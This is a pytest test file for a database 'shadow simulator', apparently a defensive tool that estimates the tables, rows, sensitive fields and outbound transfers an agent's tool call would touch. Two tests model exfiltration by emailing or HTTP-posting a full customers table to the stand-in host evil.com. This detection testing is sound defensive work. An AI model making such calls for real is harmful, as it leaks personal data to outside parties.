"""
test_shadow_simulator.py
========================
Comprehensive unit tests for DatabaseShadowSimulator.
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'backend'))

import pytest
from app.shadow.database.database_shadow_simulator import (
    DatabaseShadowSimulator, ShadowEffect, TABLE_SENSITIVITY, DANGEROUS_OPERATIONS
)
from app.shadow.database.sql_analyzer import SQLAnalyzer, SQLInfo


@pytest.fixture
def simulator():
    return DatabaseShadowSimulator()


@pytest.fixture
def analyzer():
    return SQLAnalyzer()


class TestShadowSimulatorBasic:
    """Test basic simulation functionality."""

    def test_simulate_returns_shadow_effect(self, simulator, analyzer):
        sql = "SELECT name FROM products WHERE id = 1"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        assert isinstance(effect, ShadowEffect)

    def test_simulate_with_none_sql_info(self, simulator):
        effect = simulator.simulate("cursor.execute", {"sql": "SELECT 1"}, None)
        assert isinstance(effect, ShadowEffect)
        assert effect.predicted_tables == []

    def test_simulate_empty_sql(self, simulator, analyzer):
        sql_info = analyzer.analyze("")
        effect = simulator.simulate("cursor.execute", {"sql": ""}, sql_info)
        assert isinstance(effect, ShadowEffect)


class TestShadowSimulatorTablePrediction:
    """Test table prediction."""

    def test_predict_customers_table(self, simulator, analyzer):
        sql = "SELECT * FROM customers"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        assert "customers" in effect.predicted_tables

    def test_predict_multiple_tables(self, simulator, analyzer):
        sql = "SELECT * FROM customers JOIN orders ON customers.id = orders.customer_id"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        assert "customers" in effect.predicted_tables
        assert "orders" in effect.predicted_tables

    def test_predict_from_insert(self, simulator, analyzer):
        sql = "INSERT INTO transactions (amount) VALUES (100)"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        assert "transactions" in effect.predicted_tables


class TestShadowSimulatorRowEstimation:
    """Test affected row estimation."""

    def test_bulk_no_where_high_rows(self, simulator, analyzer):
        sql = "SELECT * FROM customers"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        assert effect.affected_rows_estimate >= 50_000

    def test_with_where_moderate_rows(self, simulator, analyzer):
        sql = "SELECT * FROM customers WHERE id = 1"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        assert effect.affected_rows_estimate > 0
        assert effect.affected_rows_estimate <= 10_000

    def test_with_limit(self, simulator, analyzer):
        sql = "SELECT * FROM customers LIMIT 10"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        assert effect.affected_rows_estimate <= 10


class TestShadowSimulatorSensitiveDetection:
    """Test sensitive field detection."""

    def test_detect_sensitive_in_customers(self, simulator, analyzer):
        sql = "SELECT phone, id_card FROM customers WHERE id = 1"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        assert len(effect.sensitive_fields_detected) > 0

    def test_no_sensitive_in_products(self, simulator, analyzer):
        sql = "SELECT name, price FROM products WHERE id = 1"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        # Products table is not in TABLE_SENSITIVITY
        assert len(effect.sensitive_fields_detected) == 0

    def test_detect_salary_in_employee(self, simulator, analyzer):
        sql = "SELECT salary, bank_account FROM employee_salary WHERE id = 1"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        assert len(effect.sensitive_fields_detected) > 0


class TestShadowSimulatorExternalTransfer:
    """Test external transfer detection."""

    def test_detect_email_external(self, simulator, analyzer):
        sql = "SELECT * FROM customers"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("send_email", {"sql": sql, "to": "test@evil.com"}, sql_info)
        assert effect.is_external_transfer is True

    def test_detect_webhook_external(self, simulator, analyzer):
        sql = "SELECT * FROM customers"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("http_post", {"sql": sql, "url": "https://evil.com"}, sql_info)
        assert effect.is_external_transfer is True

    def test_no_external_for_cursor(self, simulator, analyzer):
        sql = "SELECT * FROM customers"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        assert effect.is_external_transfer is False


class TestShadowSimulatorBulkOperation:
    """Test bulk operation detection."""

    def test_bulk_no_where(self, simulator, analyzer):
        sql = "SELECT * FROM customers"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        assert effect.is_bulk_operation is True

    def test_bulk_high_rows(self, simulator, analyzer):
        sql = "SELECT * FROM customers WHERE status = 1"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        # With WHERE but estimated rows > 100, still bulk
        assert effect.is_bulk_operation is True


class TestShadowSimulatorRiskIndicators:
    """Test risk indicator collection."""

    def test_indicators_for_sensitive_query(self, simulator, analyzer):
        sql = "SELECT phone, bank_account FROM customers"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        assert len(effect.risk_indicators) > 0

    def test_indicators_for_external_transfer(self, simulator, analyzer):
        sql = "SELECT * FROM customers"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("send_email", {"sql": sql}, sql_info)
        assert "EXTERNAL_TRANSFER" in effect.risk_indicators


class TestShadowSimulatorSummary:
    """Test summary generation."""

    def test_summary_contains_operation(self, simulator, analyzer):
        sql = "SELECT name FROM products"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        assert "SELECT" in effect.summary

    def test_summary_contains_table(self, simulator, analyzer):
        sql = "SELECT name FROM products"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        assert "products" in effect.summary


class TestTableSensitivity:
    """Test TABLE_SENSITIVITY configuration."""

    def test_customers_table_exists(self):
        assert "customers" in TABLE_SENSITIVITY

    def test_patient_records_table_exists(self):
        assert "patient_records" in TABLE_SENSITIVITY

    def test_employee_salary_table_exists(self):
        assert "employee_salary" in TABLE_SENSITIVITY

    def test_table_sensitivity_has_fields(self):
        for table, (weight, fields) in TABLE_SENSITIVITY.items():
            assert 0.0 <= weight <= 1.0
            assert len(fields) > 0

    def test_dangerous_operations_defined(self):
        assert len(DANGEROUS_OPERATIONS) > 0
        for op in DANGEROUS_OPERATIONS:
            assert len(op) == 4  # (name, score, category, description)


class TestShadowEffectDataclass:
    """Test ShadowEffect dataclass."""

    def test_shadow_effect_fields(self, simulator, analyzer):
        sql = "SELECT phone FROM customers"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        assert hasattr(effect, 'predicted_tables')
        assert hasattr(effect, 'predicted_columns')
        assert hasattr(effect, 'affected_rows_estimate')
        assert hasattr(effect, 'sensitive_fields_detected')
        assert hasattr(effect, 'data_volume_mb')
        assert hasattr(effect, 'is_external_transfer')
        assert hasattr(effect, 'is_bulk_operation')
        assert hasattr(effect, 'risk_indicators')
        assert hasattr(effect, 'summary')

    def test_data_volume_is_numeric(self, simulator, analyzer):
        sql = "SELECT * FROM customers"
        sql_info = analyzer.analyze(sql)
        effect = simulator.simulate("cursor.execute", {"sql": sql}, sql_info)
        assert isinstance(effect.data_volume_mb, float)
        assert effect.data_volume_mb >= 0
